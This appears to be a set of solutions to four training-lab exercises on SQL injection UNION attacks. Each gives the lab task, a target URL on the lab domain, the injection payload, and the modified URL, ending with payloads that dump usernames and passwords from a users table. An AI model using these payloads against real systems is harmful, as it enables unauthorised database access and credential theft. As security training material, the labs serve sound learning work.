# UNION attacks

## SQL injection UNION attack, determining the number of columns returned by the query

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.

Target URL:

```
https://aca31f9a1ef0c68680045fec007d0007.web-security-academy.net/filter?category=Gifts
```

Solution:

```sql
' UNION SELECT NULL,NULL,NULL--
```

Modified URL:

```
https://aca31f9a1ef0c68680045fec007d0007.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
```

## SQL injection UNION attack, finding a column containing text

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

Target URL:

```
https://ac6c1f941e2e562780c94cde00ea0047.web-security-academy.net/filter?category=Gifts
```

Solution:

```sql
' UNION SELECT NULL,'O2ILLb',NULL--
```

Modified URL:

```
https://ac6c1f941e2e562780c94cde00ea0047.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,'O2ILLb',NULL--
```

## SQL injection UNION attack, retrieving data from other tables

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

Target URL:

```
https://ac051fca1f14458380d541dd008a005e.web-security-academy.net/filter?category=Corporate+gifts
```

Solution:

```sql
' UNION SELECT username, password FROM users--
```

Modified URL:

```
https://ac051fca1f14458380d541dd008a005e.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+username,+password+FROM+users--
```

## SQL injection UNION attack, retrieving multiple values in a single column

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

Target URL:

```
https://acbf1f841e3d61b180d8c41a00c4008c.web-security-academy.net/filter?category=Corporate+gifts
```

Solution:

```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

Modified URL:

```
https://acbf1f841e3d61b180d8c41a00c4008c.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+NULL,+username+||+'~'+||+password+FROM+users--
```